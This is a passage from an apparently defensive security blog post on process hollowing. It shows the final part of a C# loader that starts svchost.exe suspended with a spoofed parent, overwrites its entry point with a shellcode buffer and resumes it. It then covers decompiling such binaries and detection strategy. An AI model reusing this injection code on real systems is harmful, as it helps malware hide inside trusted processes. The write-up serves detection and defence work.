point.</p><p>Line 206 overwrites the entry point with our malicious code.</p><p>Line 207 is the most important part: Resume the paused Notepad thread to execute the malicious code.</p><p>Lines 209–220 this section of code performs exception handling and cleanup of memory.</p><pre class="wp-block-preformatted hljs language-csharp" data-highlighted="yes"><span class="hljs-number">171</span>     Win32.CreateProcess(
<span class="hljs-number">172</span>     <span class="hljs-literal">null</span>,
<span class="hljs-number">173</span>     <span class="hljs-string">"c:\\Windows\\System32\\svchost.exe"</span>,
<span class="hljs-number">174</span>     <span class="hljs-keyword">ref</span> processSecurity,
<span class="hljs-number">175</span>     <span class="hljs-keyword">ref</span> threadSecurity,
<span class="hljs-number">176</span>     <span class="hljs-literal">false</span>,
<span class="hljs-number">177</span>     Win32.CreationFlags.ExtendedStartupInfoPresent | Win32.CreationFlags.CreateSuspended,
<span class="hljs-number">178</span>         IntPtr.Zero,
<span class="hljs-number">179</span>         <span class="hljs-literal">null</span>,
<span class="hljs-number">180</span>         <span class="hljs-keyword">ref</span> startInfoEx,
<span class="hljs-number">181</span>         <span class="hljs-keyword">out</span> processInfo
<span class="hljs-number">182</span>         );
<span class="hljs-number">183</span>     <span class="hljs-comment">// PPID Spoofing</span>
<span class="hljs-number">184</span>  
<span class="hljs-number">185</span> <span class="hljs-comment">//  bool res = CreateProcess(null, "c:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);</span>
<span class="hljs-number">186</span>    
<span class="hljs-number">187</span>     <span class="hljs-built_in">uint</span> tmp = <span class="hljs-number">0</span>;
<span class="hljs-number">188</span>     IntPtr hProcess = processInfo.hProcess;
<span class="hljs-number">189</span>     ZwQueryInformationProcess(hProcess, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> bi, (<span class="hljs-built_in">uint</span>)(IntPtr.Size * <span class="hljs-number">6</span>), <span class="hljs-keyword">ref</span> tmp);
<span class="hljs-number">190</span>  
<span class="hljs-number">191</span>     IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + <span class="hljs-number">0x10</span>);  
<span class="hljs-number">192</span> 
<span class="hljs-number">193</span>     <span class="hljs-built_in">byte</span>[] addrBuf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[IntPtr.Size];
<span class="hljs-number">194</span>     IntPtr nRead = IntPtr.Zero;
<span class="hljs-number">195</span>     ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, <span class="hljs-keyword">out</span> nRead);
<span class="hljs-number">196</span>     IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, <span class="hljs-number">0</span>));
<span class="hljs-number">197</span>    
<span class="hljs-number">198</span>     <span class="hljs-built_in">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">0x200</span>];
<span class="hljs-number">199</span>     ReadProcessMemory(hProcess, svchostBase, data, data.Length, <span class="hljs-keyword">out</span> nRead);
<span class="hljs-number">200</span> 
<span class="hljs-number">201</span>     <span class="hljs-built_in">uint</span> e_lfanew_offset = BitConverter.ToUInt32(data, <span class="hljs-number">0x3c</span>);
<span class="hljs-number">202</span>     <span class="hljs-built_in">uint</span> opthdr = e_lfanew_offset + <span class="hljs-number">0x28</span>;
<span class="hljs-number">203</span>     <span class="hljs-built_in">uint</span> entrypoint_rva = BitConverter.ToUInt32(data, (<span class="hljs-built_in">int</span>)opthdr);
<span class="hljs-number">204</span>     IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
<span class="hljs-number">205</span> 
<span class="hljs-number">206</span>     WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, <span class="hljs-keyword">out</span> nRead);
<span class="hljs-number">207</span>     ResumeThread(processInfo.hThread);
<span class="hljs-number">208</span> }
<span class="hljs-number">209</span> <span class="hljs-keyword">catch</span> (Exception e)
<span class="hljs-number">210</span> { 
<span class="hljs-number">211</span>     Console.Error.WriteLine(e.StackTrace);
<span class="hljs-number">212</span> }
<span class="hljs-number">213</span> <span class="hljs-keyword">finally</span>
<span class="hljs-number">214</span> {
<span class="hljs-number">215</span>     Win32.DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
<span class="hljs-number">216</span>     Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
<span class="hljs-number">217</span>     Marshal.FreeHGlobal(lpValue);
<span class="hljs-number">218</span>  
<span class="hljs-number">219</span>     Console.WriteLine(<span class="hljs-string">"{0} started"</span>, processInfo.dwProcessId);
<span class="hljs-number">220</span> }
</pre><div style="height:25px;" class="wp-block-spacer"></div><h2 class="wp-block-heading">1.6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Reversing the Code</h2><p>The C code discussed earlier was compiled into a Windows 64 bit executable using MinGW, then disassembled and decompiled with Ghidra. As you can see below, the Ghidra-generated source code is a very close match to the original.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig21.png" alt="" class="wp-image-29888"><figcaption class="wp-element-caption">Figure 21 - Decompiled C Code</figcaption></figure><p>Reversing most C# code is simple with the tool <a href="https://github.com/dnSpy/dnSpy">dnSpy</a>. There are methods to hide or corrupt the .exe so that dnSpy cannot decompile it, but for the most part, attackers do not go to that extent.</p><p>To load the executable in dnSpy, simply drag and drop it onto the left pane. Once loaded, the pane will provide a tree listing of the components of the .exe.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig22.png" alt="" class="wp-image-29889"><figcaption class="wp-element-caption">Figure 22 - Decompiled C# Code</figcaption></figure><h2 class="wp-block-heading">1.7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Conclusion</h2><p>The technique of Process Hollowing is not very complicated and is useful to attackers wishing to obfuscate the attack process. As shown above, the implementation is fairly easy, and detections are not normally available in most environments and require the use of special detections.</p><p>The process of identifying and mitigating Process Hollowing techniques is challenging. It requires a fundamental understanding of process creation events, the process parent-child relationships, memory allocation, and the methods used in the technique itself. We have discussed potential strategies that hopefully inspire you to develop your own detections.</p><p>We also presented a POC detection attempting to identify Process Hollowing. While not a 'silver bullet', it provides a starting point for tuning your own detection. Remember that every environment is different, and you will need to refine and tune it to your organization.</p><p>Lastly, remember to consider these strategies as part of a defensive in-depth approach. Process Hollowing is just one of many process injection techniques and a small subset of a broader range of techniques that attackers may use. Continuously monitoring for anomalies is a never-ending battle, but with the right tools, knowledge, and attention to detail, you can effectively defend your environment.</p></div><div class="mb-p24 mt-p56 pt-p32 border-t first:border-t-none"><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=The%20Nightmare%20of%20Proc%20Hollow%E2%80%99s%20Exe%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=The%20Nightmare%20of%20Proc%20Hollow%E2%80%99s%20Exe%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fthe-nightmare-of-proc-hollows-exe&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div></div></div></div></section></div>
		</main>

		
		




  
<div class="c-modal fixed inset-0 z-100" x-comp="modal" x-data="modal({id:'modal-component'})" x-show="$store.modal.show" x-trap="$store.modal.show" x-bind:aria-hidden="!$store.modal.show" @keydown="keyPress($event)" x-transition:enter="c-modal-enter" x-transition:enter-start="c-modal-enter-start" x-transition:enter-end="c-modal-enter-end" x-transition:leave="c-modal-leave" x-transition:leave-start="c-modal-leave-start" x-transition:leave-end="c-modal-leave-end" aria-hidden="true" style="display: none;">
    <div class="w-full h-full bg-overlay fixed inset-0 z-0" tabindex="-1">

    <div class="relative z-10 flex flex-col w-full h-full justify-center items-center p-p12 mq768:p-none">
      <div id="modal-component" class="c-modal-box relative outline-none false w-full m-p24 max-w-p768" :class="modalClass(true)" :tabindex="($store.modal.show) ? '-1' : false" :aria-labelledby="showHeading() ? 'modal-component-title' : false" :aria-label="getLabel()" @focus="activate()" aria-role="dialog" x-ref="dialog">
        
          
        
        
          <div class="c-content p-p32" tabindex="-1" x-ref="content"></div>
        
        <button class="absolute z-50 overflow-hidden w-p24 h-p24 flex items-center justify-center border-black border top-p24 right-p24 group hover:bg-black" @click="closeModal()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close"></use></svg>
          <span class="sr-only">Close</span>
        </button>
        <button x-show="$store.modal.transcript" class="text-btn text-white uppercase tracking-widest px-p8 py-p16" @click="showTranscript($event)" x-text="$store.modal.showTranscript ? 'Hide Transcript' : 'Show Transcript'" style="display: none;">Show Transcript</button>
      </div>
      <div x-show="$store.modal.showTranscript" class="relative -top-ms bg-white text-segment w-full max-w-p768 mx-auto overflow-auto px-sm false m-p24" :class="modalClass()" x-ref="transcript" style="display: none;">
        <div x-collapse.duration.700ms="" style="height: 0px; overflow: hidden;">
          <div class="py-p32 mq768:px-p32" id="modal-transcript" tabindex="0"></div>
        </div>
      </div>
    </div>

  </div>
  </div>
		<!-- Start cookieyes banner --> 
 
<!-- End cookieyes banner -->

		
	


</body></html>